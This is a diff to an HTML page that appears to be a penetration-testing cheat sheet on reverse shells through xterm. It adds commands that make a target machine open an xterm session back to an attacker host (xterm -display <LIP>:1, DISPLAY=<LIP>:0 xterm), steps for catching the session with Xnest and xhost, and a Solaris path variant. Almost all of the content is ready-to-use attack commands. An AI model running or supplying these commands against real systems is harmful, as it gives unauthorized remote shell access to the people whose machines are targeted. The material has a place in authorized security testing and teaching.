@@ -6,7 +6,9 @@
 </head><body><br/>
 One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port <b>6001</b>.<br/>
 <br/>
-&nbsp;xterm -display 10.0.0.1:1 <br/>
+&nbsp;xterm -display &lt;LIP&gt;:1 <br/>
+#or<br/>
+DISPLAY=&lt;LIP&gt;:0 xterm<br/>
 <br/>
 We need to modify /etc/X11/Xwrapper.config and change the allowed_users line to look like this. This file often gets overwritten on updates. After the file has been saved, restart the X11 login manager.<br/>
 <br/>
@@ -17,5 +19,10 @@ To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port
 &nbsp;Xnest -ac :1<br/>
 <br/>
 You’ll need to authorize the target to connect to you (command also run on your host):<br/>
+xterm -display 127.0.0.1:1 # Run this OUTSIDE the Xnest<br/>
+xhost +targetip # Run this INSIDE the spawned xterm on the open X Server<br/>
 <br/>
-&nbsp;xhost +targetip</body></html>
+<br/>
+<br/>
+&nbsp;Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:<br/>
+/usr/openwin/bin/xterm -display &lt;LIP&gt;:1</body></html>
